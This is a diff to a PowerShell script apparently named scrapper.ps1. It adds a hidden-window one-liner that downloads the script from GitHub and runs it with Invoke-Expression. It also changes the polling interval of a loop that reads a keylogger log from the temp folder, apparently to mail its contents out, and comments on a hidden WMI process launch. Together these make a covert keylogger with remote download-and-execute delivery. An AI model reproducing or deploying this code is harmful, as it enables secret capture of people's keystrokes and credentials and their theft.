@@ -19,6 +19,9 @@ FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 ########## OR #############
 USE 
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')
+########## OR #############
+powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"
+
 
 .USEFUL	
 ### Measures time needed to execute certain command
@@ -426,7 +429,7 @@ function mail($messageBody){
 	$keyloggerLogFilePath = $env:temp+"\keylogger.txt"
 	while($true)
 	{
-		Sleep (5 * 1)
+		Sleep (10 * 1)
 		try{
 			if([System.IO.File]::Exists($keyloggerLogFilePath)){
 					$keyloggerFileContents = type $keyloggerLogFilePath
@@ -464,6 +467,7 @@ function mail($messageBody){
 	}
 	
 	### This problem could be solved by using this : Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command "" Sleep 300"""
+	### BUGS IN PARSING. THIS LINE DOES NOT WORK AS EXPECTED
 	###Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command $scriptBlock"
 	$results += "`n"
 	$results
